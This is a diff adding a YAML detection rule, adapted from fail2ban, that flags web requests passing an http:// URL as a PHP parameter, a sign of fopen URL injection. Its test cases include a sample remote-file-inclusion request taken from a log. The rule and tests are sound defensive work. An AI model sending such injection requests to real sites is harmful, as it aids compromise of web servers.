@@ -1,0 +1,29 @@
+---
+# Matches remote-URL-as-parameter requests, an indication of a PHP
+# fopen() URL injection: a GET or POST whose query string hands a
+# http:// URL to a script parameter. Based on fail2ban's php-url-fopen
+# filter, translated to Baphomet. The match runs against the request
+# path so a referer that merely contains =http:// does not trip it.
+#
+# Source: fail2ban config/filter.d/php-url-fopen.conf
+method:
+  - GET
+  - POST
+match:
+  - field: path
+    regexp: '\?.*=http://'
+tests:
+  positive:
+    - message: '66.185.212.172 - - [26/Mar/2009:08:44:20 -0500] "GET /index.php?n=http://eatmyfood.hostinginfive.com/pizza.htm? HTTP/1.1" 200 114 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"'
+      found: 1
+      data:
+        host: "66.185.212.172"
+  negative:
+    # a plain request with no remote URL parameter
+    - message: '198.51.100.7 - - [12/Jul/2026:08:15:50 -0500] "GET /index.php?n=5 HTTP/1.1" 200 114 "-" "Mozilla/5.0"'
+      found: 0
+      undefed: ["host"]
+    # only the referer carries =http://, not the request... must not fire
+    - message: '198.51.100.8 - - [12/Jul/2026:08:15:51 -0500] "GET /index.php HTTP/1.1" 200 114 "http://evil.example/x=http://y/" "Mozilla/5.0"'
+      found: 0
+      undefed: ["host"]
